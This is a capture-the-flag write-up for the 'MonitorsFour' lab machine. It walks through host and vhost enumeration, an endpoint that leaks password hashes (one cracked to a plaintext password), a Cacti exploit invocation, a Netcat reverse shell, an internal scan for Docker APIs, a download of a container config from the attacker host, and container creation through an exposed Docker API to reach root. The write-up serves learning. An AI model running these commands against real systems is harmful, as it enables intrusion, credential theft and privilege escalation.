# MonitorsFour Write-up

## Enumeration

I started with an Nmap scan:

```bash
nmap -sSVC -A 10.10.11.98
```

The scan showed two exposed services:

```text
80/tcp   open  http  nginx
5985/tcp open  http  Microsoft HTTPAPI httpd 2.0
```

The HTTP service redirected to:

```text
http://monitorsfour.htb/
```

The target appeared to be a Windows host.

After adding `monitorsfour.htb` to `/etc/hosts`, I enumerated virtual hosts with `ffuf`:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-u http://monitorsfour.htb \
-H "Host: FUZZ.monitorsfour.htb" -ac
```

The scan discovered:

```text
cacti.monitorsfour.htb
```

I added the new virtual host to `/etc/hosts` and continued enumeration.

## User Information Disclosure

The main application exposed a `/user` endpoint. Supplying `token=0` returned user records:

```bash
curl -s "http://monitorsfour.htb/user?token=0"
```

The response contained several users together with password hashes, roles, tokens, names, positions, dates of birth, start dates, and salaries.

A shortened version of the response is shown below:

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "name": "Michael Watson"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "name": "Jennifer Anderson"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "name": "David Thompson"
  }
]
```

The hash associated with the administrator record was cracked as MD5:

```text
Hash:   56b32eb43e6f15395f6c46c1c9e1cd36
Type:   md5
Result: wonderful1
```

The notes in the original write-up identify the Cacti username as:

```text
Marcus
```

So the credentials used against Cacti were:

```text
Username: Marcus
Password: wonderful1
```

## Cacti Foothold

The discovered Cacti instance was available at:

```text
http://cacti.monitorsfour.htb/
```

After authenticating, the original write-up shows access to the Cacti console.

To prepare the exploit environment, I created a Python virtual environment and installed the required Python packages:

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests beautifulsoup4
```

I then ran the exploit script from the original write-up:

```bash
python3 2.py \
  -u Marcus \
  -p wonderful1 \
  -i 10.10.17.253 \
  -l 8000 \
  -url http://cacti.monitorsfour.htb/
```

The source write-up does not include the contents of `2.py`, so only the invocation can be reproduced here without inventing missing code.

In another terminal, I started a Netcat listener:

```bash
nc -lvnp 8000
```

A reverse shell connected back from the target:

```text
listening on [any] 8000 ...
connect to [10.10.17.253] from (UNKNOWN) [10.10.11.98] 49875
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
www-data@821fbd6a43fa:~/html/cacti$
```

The shell was running as `www-data` inside a Linux container.

Basic enumeration from the shell showed:

```bash
id
ls -la /home
ls -la /home/marcus
```

The `/home/marcus` directory was accessible from the container. The user flag was available there, but the flag value and the command used to print it are intentionally omitted from this public version.

## Internal Network Enumeration

From the compromised container, I scanned the internal `192.168.65.0/24` subnet for an exposed Docker API on TCP port `2375`.

The one-liner shown in the original screenshot was:

```bash
for i in $(seq 1 254); do
    (
        curl -s --connect-timeout 1 \
        http://192.168.65.$i:2375/version 2>/dev/null \
        | grep -q "ApiVersion" \
        && echo "192.168.65.$i:2375 OPEN"
    ) &
done
wait
```

The scan found:

```text
192.168.65.7:2375 OPEN
```

Querying the Docker API confirmed that the endpoint was reachable.

The original write-up labels the next step as:

```text
CVE-2025-9074
```

## Docker API Enumeration

I listed locally available Docker images:

```bash
curl -s http://192.168.65.7:2375/images/json \
| grep -o '"RepoTags":\[[^]]*\]'
```

The response contained:

```text
"RepoTags":["docker_setup-nginx-php:latest"]
"RepoTags":["docker_setup-mariadb:latest"]
"RepoTags":["alpine:latest"]
```

## Container Creation and Privilege Escalation

The final screenshot shows a JSON Docker container configuration being downloaded from the attacker's HTTP server:

```bash
curl 10.10.17.253:60000/container.json \
-o /tmp/container.json
```

The exact contents of `container.json` are not present in the source write-up, so they cannot be reproduced faithfully here.

The JSON configuration was then submitted to the exposed Docker API:

```bash
curl -X POST \
-H 'Content-Type: application/json' \
-d @/tmp/container.json \
http://192.168.65.7:2375/containers/create?name=pwned
```

In the captured run, Docker returned a conflict because a container named `pwned` already existed. The response disclosed the existing container ID.

The existing container was then started through the Docker API:

```bash
curl -X POST \
http://192.168.65.7:2375/containers/<CONTAINER_ID>/start
```

Finally, its stdout logs were requested:

```bash
curl \
"http://192.168.65.7:2375/containers/<CONTAINER_ID>/logs?stdout=true"
```

The original screenshot shows that this step produced the root flag. The value itself has been removed from this public write-up.

## Attack Path

```text
Nmap
  ↓
monitorsfour.htb
  ↓
Virtual-host enumeration
  ↓
cacti.monitorsfour.htb
  ↓
/user?token=0 information disclosure
  ↓
Password hash disclosure
  ↓
MD5 cracked -> wonderful1
  ↓
Cacti login as Marcus
  ↓
Cacti exploit script
  ↓
Reverse shell as www-data
  ↓
Internal network scan
  ↓
192.168.65.7:2375
  ↓
Exposed Docker API
  ↓
Container creation / start through Docker API
  ↓
Privileged container output
  ↓
root
```
